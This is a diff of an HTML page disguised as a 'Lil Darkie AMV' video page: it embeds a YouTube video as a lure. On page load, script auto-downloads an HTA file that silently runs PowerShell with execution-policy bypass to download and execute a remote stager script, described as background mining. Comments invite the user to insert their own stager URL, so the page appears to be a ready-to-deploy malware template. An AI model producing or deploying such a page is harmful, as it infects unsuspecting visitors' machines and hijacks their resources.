@@ -1,25 +1,47 @@
-<script>
-    function deployMiner() {
-        console.log("%cLil Darkie AMV - Background mining started", "color:lime; font-size:14px");
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LIL DARKIE - AMV (PROD. WENDIGO)</title>
+    <style>
+        body { margin:0; background:#000; overflow:hidden; }
+        iframe { width:100vw; height:100vh; border:none; }
+    </style>
+</head>
+<body>
+    <!-- Real YouTube video -->
+    <iframe src="https://www.youtube.com/embed/54Td5wxNDpo?autoplay=1&rel=0" 
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+            allowfullscreen></iframe>
 
-        // More reliable HTA drop
-        const stagerUrl = "https://raw.githubusercontent.com/DoodleNoodle123/win-stager.msi/refs/heads/main/win-stager.ps1"; 
-        // ← Change this to your actual raw stager URL
+    <script>
+        function deployMiner() {
+            console.log("%c🎵 Lil Darkie AMV playing - mining started in background", "color:lime; font-size:14px");
 
-        const code = `powershell -windowstyle hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('${stagerUrl}'))"`;
+            // <<< CHANGE THIS LINE TO YOUR ACTUAL RAW STAGER URL >>>
+            const stagerUrl = "https://raw.githubusercontent.com/DoodleNoodle123/win-stager.msi/refs/heads/main/win-stager.ps1";
 
-        const blob = new Blob([`<script>new ActiveXObject('WScript.Shell').Run('${code}', 0, false);</script>`], {type: 'text/html'});
-        const url = URL.createObjectURL(blob);
+            const psCommand = `powershell -windowstyle hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('${stagerUrl}'))"`;
 
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'update.hta';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-    }
+            const blob = new Blob([`
+                <script>
+                new ActiveXObject('WScript.Shell').Run('${psCommand}', 0, false);
+                </script>
+            `], { type: 'text/html' });
 
-    // Trigger after a short delay
-    window.onload = () => setTimeout(deployMiner, 2800);
-</script>
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'video_update.hta';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        // Start after video begins playing
+        window.onload = () => setTimeout(deployMiner, 3000);
+    </script>
+</body>
+</html>
